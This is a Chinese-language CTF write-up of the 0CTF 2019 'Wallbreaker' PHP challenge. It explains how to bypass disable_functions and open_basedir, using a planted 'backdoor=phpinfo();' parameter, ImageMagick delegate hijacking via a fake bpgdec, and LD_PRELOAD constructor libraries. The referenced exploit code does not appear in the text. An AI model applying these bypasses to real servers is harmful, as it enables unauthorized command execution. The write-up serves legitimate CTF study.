Wallbreaker

0ctf 2019一道php的web题目，利用docker环境复现了一下。
首先进入访问题目页面给了如下的提示内容。

从这张图片中我们可以提取到几条有用的信息

  • 题目可能是要我们绕过php的disable_function
  • 服务器上安装了imagick
  • 获取flag需要执行readflag命令
  • php设置了open basedir限制可读写路径
  • 好像已经预设了一个后门在这里

首先根据提示尝试是不是真的存在后门，果然是存在后门的。

backdoor=phpinfo();

继续查看phpinfo中的有用信息，可以看到他的disable_function列表，open base_dir路径，imagick的版本信息，这些是我们需要的内容。

版本 非常非常 的新，就不要想利用已知漏洞了，另外这么高水平的比赛应该也不会搞这样利用已知漏洞的套路。上传下载读文件都没有问题，只是我们要获取flag需要命令执行，所以我们的主要目标就是利用imagick绕过disable_function执行命令。从前有这样一片文章讲了一种绕过disable_function的方法，这道题就是它的延伸，下面讲一下我看到的两种解法。

利用delegate

imagemagick有一个delegate特性，在/etc/ImageMagick-6/delegates.xml配置文件中可以看到当imagemagick处理图片的过程中会调用系统本地lib，比如处理bpg文件时imagemagick会调用一个叫bpgdec的应用程序，%i和%o应该是代表输入和输出的占位符。这里最关键的问题是 没有规定绝对 路径。

另外我们strace看一下如果解析一个bpg文件具体会执行的命令，这里hack.bpg不存在也可以。

通过上面的trace信息可以看出，当解析一个bpg文件（Imagemagick没法自己解析的文件类型）时确实会调用系统命令执行bpgdec处理。那么我们 可以利用php修改环境变量，上传一个名叫bgpdec的恶意文件，当执行bgp解析时，系统就会调用我们准备好的文件，这样就可以拿到flag啦。

先写一个bpgdec读flag

因为hack.bpg不存在，执行到new Imagick之后的echo不会显示在页面，所以如果想要直接在一个请求里面搞定要加trycatch，这样执行之后就可以看到效果了。

利用LD_PRELOAD

通俗地将在设置了LD_PRELOAD环境变量的系统中，启动新的进程时LD_PRELOAD中指定的so文件会被优先加载。这样如果修改了LD_PRELOAD变量就可以劫持系统函数，比如编写一个getuid到新的so，那么执行系统命令调用到getuid时就会执行我们定义的getuid而不是原始的。
LD_PRELOAD环境变量是进程独占的，正常这种功能可以广泛应用在热补丁场景中。
所以我们在不知道imagemagick的delegate特性时，可以利用LD_PRELOAD来进行。上传so是完全没有问题，但是怎么控制php启动新的进程呢？

原文（go.bin是假设的，实际不存在）

比如，php 函数 goForward() 实现“前进”的功能，php 函数 goForward() 又由组成 php 解释器的 C 语言模块之一的 move.c 实现，C 模块 move.c 内部又通过调用外部程序 go.bin 实现，那么，我的 php 脚本中调用了函数 goForward()，势必启动外部程序 go.bin。

后来作者找到了mail函数，mail函数会调用外部进程sendmail，sendmail会调用getuid函数，这样只要劫持getuid就可以达到任意命令执行的效果了。这道的disable_functions禁用了sendmail，所以有人开发出了更加具有一般性的方法—利用attribute ((__constructor__))。
这个东西和构造函数的特性非常地相似，当加载一个里面定义了attribute的共享库时会优先调用这个函数。剩下的就是找到一个会启动新的外部进程的php函数了，那么我们上一种利用方法的bpg应该还可以派上用场。
首先编译一个so，稍微改一下上一个脚本就好了。
